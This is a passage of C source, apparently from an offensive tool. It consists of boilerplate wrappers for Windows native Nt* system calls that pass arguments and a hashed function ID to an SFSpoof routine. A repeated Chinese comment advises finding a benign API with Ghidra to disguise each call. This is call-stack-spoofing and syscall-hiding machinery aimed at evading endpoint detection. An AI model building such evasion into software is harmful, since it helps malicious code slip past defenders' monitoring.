    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)ClientId;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0FCDFE27D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenTimer(PHANDLE TimerHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x01DCE6746;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenTransaction(PHANDLE TransactionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, LPGUID Uow, HANDLE TmHandle) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)Uow;
    Params.param[5] = (DWORD_PTR)TmHandle;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0DC4BFE9B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenTransactionManager(PHANDLE TmHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PUNICODE_STRING LogFileName, LPGUID TmIdentity, ULONG OpenOptions) {
    Params.param[1] = (DWORD_PTR)TmHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)LogFileName;
    Params.param[5] = (DWORD_PTR)TmIdentity;
    Params.param[6] = (DWORD_PTR)OpenOptions;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x01D5D29DC;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPlugPlayControl(PLUGPLAY_CONTROL_CLASS PnPControlClass, PVOID PnPControlData, ULONG PnPControlDataLength) {
    Params.param[1] = (DWORD_PTR)PnPControlClass;
    Params.param[2] = (DWORD_PTR)PnPControlData;
    Params.param[3] = (DWORD_PTR)PnPControlDataLength;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x013CFDD95;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPrePrepareComplete(HANDLE EnlistmentHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0BB39D42D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPrePrepareEnlistment(HANDLE EnlistmentHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x059C69E8D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPrepareComplete(HANDLE EnlistmentHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0B93451B9;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPrepareEnlistment(HANDLE EnlistmentHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x018471DCD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPrivilegeCheck(HANDLE ClientToken, PPRIVILEGE_SET RequiredPrivileges, PBOOLEAN Result) {
    Params.param[1] = (DWORD_PTR)ClientToken;
    Params.param[2] = (DWORD_PTR)RequiredPrivileges;
    Params.param[3] = (DWORD_PTR)Result;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x034B6052D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPrivilegeObjectAuditAlarm(PUNICODE_STRING SubsystemName, PVOID HandleId, HANDLE ClientToken, ACCESS_MASK DesiredAccess, PPRIVILEGE_SET Privileges, BOOLEAN AccessGranted) {
    Params.param[1] = (DWORD_PTR)SubsystemName;
    Params.param[2] = (DWORD_PTR)HandleId;
    Params.param[3] = (DWORD_PTR)ClientToken;
    Params.param[4] = (DWORD_PTR)DesiredAccess;
    Params.param[5] = (DWORD_PTR)Privileges;
    Params.param[6] = (DWORD_PTR)AccessGranted;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x032B5D2A2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPrivilegedServiceAuditAlarm(PUNICODE_STRING SubsystemName, PUNICODE_STRING ServiceName, HANDLE ClientToken, PPRIVILEGE_SET Privileges, BOOLEAN AccessGranted) {
    Params.param[1] = (DWORD_PTR)SubsystemName;
    Params.param[2] = (DWORD_PTR)ServiceName;
    Params.param[3] = (DWORD_PTR)ClientToken;
    Params.param[4] = (DWORD_PTR)Privileges;
    Params.param[5] = (DWORD_PTR)AccessGranted;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x05ADC5BB2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPropagationComplete(HANDLE ResourceManagerHandle, ULONG RequestCookie, ULONG BufferLength, PVOID Buffer) {
    Params.param[1] = (DWORD_PTR)ResourceManagerHandle;
    Params.param[2] = (DWORD_PTR)RequestCookie;
    Params.param[3] = (DWORD_PTR)BufferLength;
    Params.param[4] = (DWORD_PTR)Buffer;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x03EBCA6BE;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPropagationFailed(HANDLE ResourceManagerHandle, ULONG RequestCookie, NTSTATUS PropStatus) {
    Params.param[1] = (DWORD_PTR)ResourceManagerHandle;
    Params.param[2] = (DWORD_PTR)RequestCookie;
    Params.param[3] = (DWORD_PTR)PropStatus;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x03C5AC745;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPulseEvent(HANDLE EventHandle, PULONG PreviousState) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = (DWORD_PTR)PreviousState;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0F8AADF31;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryAuxiliaryCounterFrequency(PULONGLONG lpAuxiliaryCounterFrequency) {
    Params.param[1] = (DWORD_PTR)lpAuxiliaryCounterFrequency;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0B0562E46;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryBootEntryOrder(PULONG Ids, PULONG Count) {
    Params.param[1] = (DWORD_PTR)Ids;
    Params.param[2] = (DWORD_PTR)Count;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x00F5219B7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryBootOptions(PBOOT_OPTIONS BootOptions, PULONG BootOptionsLength) {
    Params.param[1] = (DWORD_PTR)BootOptions;
    Params.param[2] = (DWORD_PTR)BootOptionsLength;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0C818F4B0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryDebugFilterState(ULONG ComponentId, ULONG Level) {
    Params.param[1] = (DWORD_PTR)ComponentId;
    Params.param[2] = (DWORD_PTR)Level;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0D28DC222;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)FileInformation;
    Params.param[7] = (DWORD_PTR)Length;
    Params.param[8] = (DWORD_PTR)FileInformationClass;
    Params.param[9] = (DWORD_PTR)QueryFlags;
    Params.param[10] = (DWORD_PTR)FileName;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 10;
    Params.FuncHash = 0x0388A7E55;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryDirectoryObject(HANDLE DirectoryHandle, PVOID Buffer, ULONG Length, BOOLEAN ReturnSingleEntry, BOOLEAN RestartScan, PULONG Context, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)DirectoryHandle;
    Params.param[2] = (DWORD_PTR)Buffer;
    Params.param[3] = (DWORD_PTR)Length;
    Params.param[4] = (DWORD_PTR)ReturnSingleEntry;
    Params.param[5] = (DWORD_PTR)RestartScan;
    Params.param[6] = (DWORD_PTR)Context;
    Params.param[7] = (DWORD_PTR)ReturnLength;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x006AE3013;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryDriverEntryOrder(PULONG Ids, PULONG Count) {
    Params.param[1] = (DWORD_PTR)Ids;
    Params.param[2] = (DWORD_PTR)Count;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x09FB44CE8;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryEaFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PFILE_FULL_EA_INFORMATION Buffer, ULONG Length, BOOLEAN ReturnSingleEntry, PFILE_GET_EA_INFORMATION EaList, ULONG EaListLength, PULONG EaIndex, BOOLEAN RestartScan) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = (DWORD_PTR)Buffer;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)ReturnSingleEntry;
    Params.param[6] = (DWORD_PTR)EaList;
    Params.param[7] = (DWORD_PTR)EaListLength;
    Params.param[8] = (DWORD_PTR)EaIndex;
    Params.param[9] = (DWORD_PTR)RestartScan;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x0B6284E3A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryFullAttributesFile(POBJECT_ATTRIBUTES ObjectAttributes, PFILE_NETWORK_OPEN_INFORMATION FileInformation) {
    Params.param[1] = (DWORD_PTR)ObjectAttributes;
    Params.param[2] = (DWORD_PTR)FileInformation;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0183B9E1A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationAtom(USHORT Atom, ATOM_INFORMATION_CLASS AtomInformationClass, PVOID AtomInformation, ULONG AtomInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)Atom;
    Params.param[2] = (DWORD_PTR)AtomInformationClass;
    Params.param[3] = (DWORD_PTR)AtomInformation;
    Params.param[4] = (DWORD_PTR)AtomInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x052DEB58A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationByName(POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass) {
    Params.param[1] = (DWORD_PTR)ObjectAttributes;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = (DWORD_PTR)FileInformation;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)FileInformationClass;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0129A5939;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationEnlistment(HANDLE EnlistmentHandle, ENLISTMENT_INFORMATION_CLASS EnlistmentInformationClass, PVOID EnlistmentInformation, ULONG EnlistmentInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)EnlistmentInformationClass;
    Params.param[3] = (DWORD_PTR)EnlistmentInformation;
    Params.param[4] = (DWORD_PTR)EnlistmentInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x05BC4BC9F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationJobObject(HANDLE JobHandle, JOBOBJECTINFOCLASS JobObjectInformationClass, PVOID JobObjectInformation, ULONG JobObjectInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)JobHandle;
    Params.param[2] = (DWORD_PTR)JobObjectInformationClass;
    Params.param[3] = (DWORD_PTR)JobObjectInformation;
    Params.param[4] = (DWORD_PTR)JobObjectInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x031032781;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationPort(HANDLE PortHandle, PORT_INFORMATION_CLASS PortInformationClass, PVOID PortInformation, ULONG Length, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)PortInformationClass;
    Params.param[3] = (DWORD_PTR)PortInformation;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x026B2533C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationResourceManager(HANDLE ResourceManagerHandle, RESOURCEMANAGER_INFORMATION_CLASS ResourceManagerInformationClass, PVOID ResourceManagerInformation, ULONG ResourceManagerInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)ResourceManagerHandle;
    Params.param[2] = (DWORD_PTR)ResourceManagerInformationClass;
    Params.param[3] = (DWORD_PTR)ResourceManagerInformation;
    Params.param[4] = (DWORD_PTR)ResourceManagerInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0A762AFF8;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationTransaction(HANDLE TransactionHandle, TRANSACTION_INFORMATION_CLASS TransactionInformationClass, PVOID TransactionInformation, ULONG TransactionInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)TransactionInformationClass;
    Params.param[3] = (DWORD_PTR)TransactionInformation;
    Params.param[4] = (DWORD_PTR)TransactionInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0CC87E2DF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInformationTransactionManager(HANDLE TransactionManagerHandle, TRANSACTIONMANAGER_INFORMATION_CLASS TransactionManagerInformationClass, PVOID TransactionManagerInformation, ULONG TransactionManagerInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)TransactionManagerHandle;
    Params.param[2] = (DWORD_PTR)TransactionManagerInformationClass;
    Params.param[3] = (DWORD_PTR)TransactionManagerInformation;
    Params.param[4] = (DWORD_PTR)TransactionManagerInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0082F297C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

